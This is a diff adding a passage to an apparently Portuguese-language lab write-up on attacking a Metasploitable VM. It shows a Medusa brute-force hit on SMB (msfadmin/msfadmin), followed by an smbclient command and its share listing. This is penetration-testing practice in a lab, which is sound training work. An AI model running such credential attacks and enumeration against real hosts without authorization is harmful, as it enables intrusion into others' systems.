@@ -301,4 +301,37 @@ Medusa V2.3 (http://www.foofus.net) (c) JoMo-Kun / Foofus Networks <jmk@foofus.n
 
 2025-11-30 22:49:19 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMINS - Access Allowed)]
 
+VALIDANDO ACESSO AO SMB COM A CREDENCIAL ENCONTRADA
 
+$ smbclient -L //192.168.56.101 -U msfadmin
+
+Password for [WORKGROUP\msfadmin]:
+
+        Sharename       Type      Comment
+        
+        ---------       ----      -------
+        
+        print$          Disk      Printer Drivers
+        
+        tmp             Disk      oh noes!
+        
+        opt             Disk
+        
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        
+        msfadmin        Disk      Home Directories
+        
+
+Reconnecting with SMB1 for workgroup listing.
+
+        Server          Comment
+        
+        ------          -------
+
+        Workgroup       Master
+        
+        ---------       ------
+        
+        WORKGROUP       METASPLOITABLE
